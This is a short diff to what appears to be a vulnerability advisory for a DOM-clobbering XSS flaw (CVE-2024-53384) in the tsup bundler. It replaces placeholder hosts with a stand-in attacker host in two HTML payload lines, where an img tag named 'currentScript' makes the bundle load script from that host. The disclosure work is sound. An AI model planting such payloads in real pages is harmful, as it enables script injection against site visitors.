@@ -4,7 +4,7 @@
 
 + Library: tsup
 + Stars: 8.9K
-+ Payload: ```<img src="https://xxx.xxx.xxx" name="currentScript">```
++ Payload: ```<img src="https://attack.hulk" name="currentScript">```
 + Impact: XSS
 + CVE: CVE-2024-53384
 + Version: v8.3.4
@@ -37,7 +37,7 @@ document.head.append(s)
 example html:
 
 <!-- ```html
-<img name="currentScript" src="//xxx.xxx.xxx"></img>
+<img name="currentScript" src="//attack.hulk"></img>
 <script src="dist/index.js"></script>
 ``` -->
 
